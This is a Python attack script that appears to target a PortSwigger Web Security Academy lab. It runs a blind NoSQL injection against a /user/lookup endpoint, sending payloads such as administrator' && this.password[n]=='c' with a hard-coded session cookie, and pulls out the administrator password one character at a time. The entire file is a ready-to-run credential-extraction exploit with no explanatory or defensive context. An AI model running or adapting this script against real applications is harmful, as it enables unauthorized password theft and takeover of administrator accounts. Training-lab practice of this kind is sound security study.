#!/usr/bin/env python3
import requests
import string

url = "https://0a29003903789b08834d2315000b0044.web-security-academy.net/user/lookup"
headers = {
    "Cookie": "session=y3FZBi1RbeHg55netkMKC5edP19uln6A",
    "Content-Type": "application/x-www-form-urlencoded"
}

charset = string.ascii_lowercase + string.digits
password = ""

print("Extracting administrator password...")

for position in range(8):
    found = False
    for char in charset:
        payload = f"user=administrator'+%26%26+this.password[{position}]=='{char}'+||+'a'%3d%3d'b"
        response = requests.post(url, headers=headers, data=payload)

        if "administrator" in response.text:
            password += char
            print(f"Position {position}: {char} (Password so far: {password})")
            found = True
            break

    if not found:
        print(f"Could not find character at position {position}")
        break

print(f"\nFull administrator password: {password}")